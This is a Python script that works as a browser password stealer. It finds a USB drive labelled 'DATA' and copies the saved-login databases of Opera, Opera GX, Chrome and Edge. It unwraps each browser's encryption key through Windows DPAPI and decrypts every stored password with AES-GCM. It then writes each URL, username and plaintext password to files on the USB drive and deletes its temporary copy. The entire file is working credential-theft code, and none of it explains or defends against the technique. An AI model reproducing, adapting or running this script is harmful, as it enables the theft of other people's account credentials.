import os
import sys
import win32crypt
import shutil
from Crypto.Cipher import AES
import sqlite3
import json
import string
import base64
import datetime

def usb_drive():
    drives = [[f"{letter}:"] for letter in string.ascii_uppercase]
    found = False
    for drive in drives:
        drive = " ".join(drive)
        try:
            if os.path.exists(drive):
                name = os.popen(f"vol {drive}").read()
                name = name.split()
                if name[0].lower() == "volume":
                    if name[5] == "DATA":
                        print(f"[+] USB drive found: {name[3]}")
                        return name[3]
        except Exception as e:
            print(e)
    print("[-] No USB drive found")
    sys.exit()

usb_dir = os.path.join(f"{usb_drive()}:\\Data")

with open(os.path.join(usb_dir, 'summary.txt'), "a") as f:
    f.write("")

def summary(data):
    with open(os.path.join(usb_dir, 'summary.txt'), "a") as f:
        f.write(data+"\n")


def log_error(error):
    error_log = os.path.join(usb_dir, "error_log.txt")
    with open(error_log, "a") as f:
        f.write(f"Error: \"{error}\" Date:{(datetime.datetime.now()).strftime("%Y-%m-%d %H:%M")}\n")



def browser():
    used_browsers = {}
    browsers = {
        'opera': {
            'name': 'Opera',
            'browser_dir': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable'),
            'login_data_path': os.path.join(os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable'), "Login Data"),
            'local_state_path': os.path.join(os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable'), "Local State")
        },
        'operagx': {
            'name': 'Opera GX',
            'browser_dir': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera GX Stable'),
            'login_data_path': os.path.join(os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera GX Stable'), "Login Data"),
            'local_state_path': os.path.join(os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera GX Stable'), "Local State")
        },
        'chrome': {
            'name': 'Google Chrome',
            'browser_dir': os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data"),
            'login_data_path': os.path.join(os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data"), "Default", "Login Data"),
            'local_state_path': os.path.join(os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data"), "Local State")
        },
        'edge': {
            'name': 'Microsoft Edge',
            'browser_dir': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'),
            'login_data_path': os.path.join(os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'), "Default", "Login Data"),
            'local_state_path': os.path.join(os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'), "Local State")
        }
    }

    # Check which browsers exist on the system
    for browser_id, browser_info in browsers.items():
        summary(f"Checking {browser_info['name']}...")
        if (os.path.exists(browser_info['login_data_path']) and 
            os.path.exists(browser_info['local_state_path'])):
            summary(f"[+] Found {browser_info['name']}")
            used_browsers[browser_id] = browser_info
        else:
            summary(f"[-] {browser_info['name']} not found")
        
    return used_browsers
    
used_browsers = browser()

def get_passwords(browser):

    browser_dir = browser['browser_dir']
    login_data_dir = browser['login_data_path']
    local_state_path = browser['local_state_path']

    if not os.path.exists(browser_dir):
        log_error("Browser directory not found")

    urls = []
    usernames = []
    passwords = []
    
    if not os.path.exists(login_data_dir):
        log_error("Login data path not found.")
        summary("[-] Login data not found")
        sys.exit()

    summary("[+] Login data directory found")
    temp_db_dir = os.path.join(browser_dir, 'temp_db.db')
    if not os.path.exists(temp_db_dir):
        with open(temp_db_dir, "wb"):
            pass
    try:
        shutil.copy2(login_data_dir, temp_db_dir)
        summary('[+] Temp database created succesfully')   

    except Exception as e:
        summary("[-] Failed to copy database")
        log_error(f"Failed to copy data base: {e}")
        sys.exit()

    conn = sqlite3.connect(temp_db_dir)
    cursor = conn.cursor()

    try:
        login_data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        summary("[+] Succesfully obtained user login data")

    except Exception as e:
        summary("[-] Unable to exctract login data from database")
        log_error(f"Unable to obtain login data from database: {e}")
        sys.exit()


    if not os.path.exists(local_state_path):
        summary("[-] Local state file not found")
        log_error("Could not find local sate file")
        sys.exit()

    with open(local_state_path, "r") as f:
        encrypted_key = json.loads(f.read())
        encrypted_key = encrypted_key["os_crypt"]["encrypted_key"]
    try:
        key = base64.b64decode(encrypted_key)
        key = key[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        summary("[+] Successfully obtained the encryption key")
    except Exception as e:
        summary("[-] Unable to obtain encryption key")
        log_error(f"Unable to obtain encryption key: {e}")
        sys.exit()
    try:
        with open(os.path.join(usb_dir, f"Browser_Passwords_{browser['name']}.txt"), "w") as f:
            f.write("-" * 50 + f"\nAll Passwords stored in {browser['name']}:\n" + "-" * 50 + "\n" )
        for row in login_data:
            urls.append(row[0])
            usernames.append(row[1])
            password = row[2]

            #Decrypt password
            if not password:
                    continue
            if len(password) > 15 and password[0:3] == b'v10':
                iv = password[3:15]
                password = password[15:]

                cipher = AES.new(key, AES.MODE_GCM, iv)

                decrypted_password = cipher.decrypt(password)
                decrypted_password = decrypted_password[:-16].decode()
                passwords.append(decrypted_password)
            try:
                with open(os.path.join(usb_dir, f"Browser_Passwords_{browser['name']}.txt"), "a") as f:
                    f.write("-" * 50 + "\n")
                    f.write(f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {decrypted_password}\n")
                    f.write("-" * 50 + "\n")
                summary("[+] Succesfully stored login data")
            except Exception as e:
                summary("[-] Failed to save login data")
                log_error(f"Failed to save login data: {e}")
        cursor.close()
        conn.close()
        summary("[+] Passwords successfully decrypted and saved")
    except Exception as e:
        summary("[-] Failed to decrypt passwords")
        log_error(f"Failed to decrypt passwords: {e}")
        
    summary("[+] CLeaning up...")
    try:
        os.remove(temp_db_dir)
        summary("[+] Cleaned up succesfully")
    except Exception as e:
        summary("[-] Failed to clean up")
        log_error(f"Failed to cleanup: {e}")

    return usernames, passwords

for used_browser in used_browsers:
    summary(f"Extracting passwords for: {used_browser}")
    usernames, passwords = get_passwords(used_browsers[used_browser])




